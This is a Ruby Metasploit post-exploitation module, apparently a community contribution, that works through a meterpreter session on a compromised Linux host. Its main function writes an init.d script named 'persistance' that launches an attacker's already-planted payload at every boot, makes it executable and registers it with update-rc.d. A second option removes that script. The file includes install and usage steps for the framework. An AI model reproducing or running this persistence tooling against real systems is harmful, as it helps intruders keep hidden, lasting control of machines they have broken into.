##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0
#
#
# [ DESCRIPTION ]
# Builds 'persistance' init.d startup script that allow users to
# persiste your binary (executable) on Linux distros at every startup.
# HINT: This post-module accepts any 'linux' chmoded payloads (sh|py|rb|etc..)
# HINT: This post-module requires the payload allready deployed on target system.
# HINT: In Kali distos we are 'root' by default, so this post module does
# not required privilege escalation in systems were we are allready root ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on           => set SESSION 3
# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
# The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
# Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
# msf post(kali_initd_persistence) > info
# msf post(kali_initd_persistence) > show options
# msf post(kali_initd_persistence) > show advanced options
# msf post(kali_initd_persistence) > set [option(s)]
# msf post(kali_initd_persistence) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##




#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Linux Kali init.d persistence post-module',
                        'Description'   => %q{
                                        Builds 'persistance' init.d startup script that allow users to persiste your binary (executable) on Linux distros at every startup. This post-module requires the payload allready deployed on target system and accepts any 'linux' chmoded payloads (sh|py|rb|etc) to be auto-executed at startup.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.4',
                        'DisclosureDate' => 'jun 1 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/ny69NS' ],
                                         [ 'URL', 'http://goo.gl/LZG1LQ' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',             # Default its to run againts session 1
                                         'INIT_PATH' => '/etc/init.d', # Default init.d directory full path
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/payload)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                        ], self.class) 

        end



#
# Build remote init.d persistence script ..
#
def ls_stage1

  session = client
  rem = session.sys.config.sysinfo
  remote_path = datastore['REMOTE_PATH'] # /root/payload
  init = datastore['INIT_PATH']          # /etc/init.d
  script_check = "#{init}/persistance"   # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['REMOTE_PATH'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set REMOTE_PATH option!")
    return nil
  else
    print_status("Persist #{remote_path} agent ..")
    Rex::sleep(1.0)
  end


    #
    # Check if persistence its allready active ..
    #
    if session.fs.file.exist?(script_check)
      print_error("init.d: #{script_check} found ..")
      print_error("Post-module reports that persistence its allready active ..")
      print_error("Please use DEL_PERSISTENCE option before running this funtion ..")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    if not session.fs.file.exist?(remote_path)
      print_error("agent: #{remote_path} not found ..")
      print_error("Please upload your agent before running this funtion ..")
      return nil
    end
    print_status("Remote agent full path found ..")

      #
      # This is the init.d script that provides persistence on startup ..
      #
      print_warning("Writing init.d persistence startup script ..")
      Rex::sleep(1.0)
      File.open("#{script_check}", "w+") do |f|
        f.write("#!/bin/sh\n")
        f.write("### BEGIN INIT INFO\n")
        f.write("# Provides:          persistence on kali\n")
        f.write("# Required-Start:    $network $local_fs $remote_fs\n")
        f.write("# Required-Stop:     $remote_fs $local_fs\n")
        f.write("# Default-Start:     2 3 4 5\n")
        f.write("# Default-Stop:      0 1 6\n")
        f.write("# Short-Description: Persiste your binary (elf) in kali linux.\n")
        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems\n")
        f.write("### END INIT INFO\n")
        f.write("#\n")
        f.write("# Give a little time to execute elf agent\n")
        f.write("sleep 5 > /dev/null\n")
        f.write(".#{remote_path}")
        f.close
      end
      print_good("Service path: #{script_check}")
      Rex::sleep(1.0)

      #
      # Config init.d startup service (chmod + update-rc.d)
      #
      if session.fs.file.exist?(script_check)
        print_good("Config init.d persistence script ..")
        Rex::sleep(1.0)
        cmd_exec("chmod +x #{script_check}")
        print_good("Update init.d service status (symlinks) ..")
        Rex::sleep(1.0)
        cmd_exec("update-rc.d persistance defaults # 97 03")
      else
        print_error("init.d script: #{script_check} not found ..")
        print_error("Persistence not achieved ..")
        return nil
      end

    #
    # Final displays to user ..
    #
    print_status("Persistence achieved on: #{rem['Computer']}")
    Rex::sleep(1.0)
    print_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end





#
# Delete init.d script and confs ..
#
def ls_stage2

  session = client
  rem = session.sys.config.sysinfo
  init = datastore['INIT_PATH']        # /etc/init.d
  script_check = "#{init}/persistance" # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEL_PERSISTENCE'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_PERSISTENCE option!")
    return nil
  else
    print_status("Delete init.d persistence script ..")
    Rex::sleep(1.0)
  end

    #
    # Check init.d persiste script existance ..
    #
    if not session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not found ..")
      return nil
    end
    print_status("Persistence script full path found ..")

      #
      # Delete init.d script ..
      #
      print_good("Deleting persistence service (symlinks) ..")
      cmd_exec("update-rc.d persistance remove")
      Rex::sleep(1.5)
      print_good("Removing script from init.d directory ..")
      cmd_exec("rm -f #{script_check}")
      Rex::sleep(1.0)

    #
    # Check init.d persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not proper deleted ..")
      print_error("Please manually delete : rm -f #{init}/persistance")
      print_error("Please manually execute: update-rc.d persistance remove")
      return nil
    end

    #
    # Final displays to user ..
    #
    print_status("Persistence deleted from: #{rem['Computer']}")
    print_warning("This module will NOT delete the binary from target ..")
    Rex::sleep(1.0)
    print_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end





# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    |  Kali Linux init.d persistence post-module  |")
    print_line("    |            Author : r00t-3xp10it            |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    if not sysinfo['OS'] =~ /Linux/
      print_error("[ ABORT ]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    if not runtor =~ /uid=0/
      print_error("[ ABORT ]: Root access is required in non-Kali distros ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['REMOTE_PATH']
         ls_stage1
      end

      if datastore['DEL_PERSISTENCE']
         ls_stage2
      end
   end
end
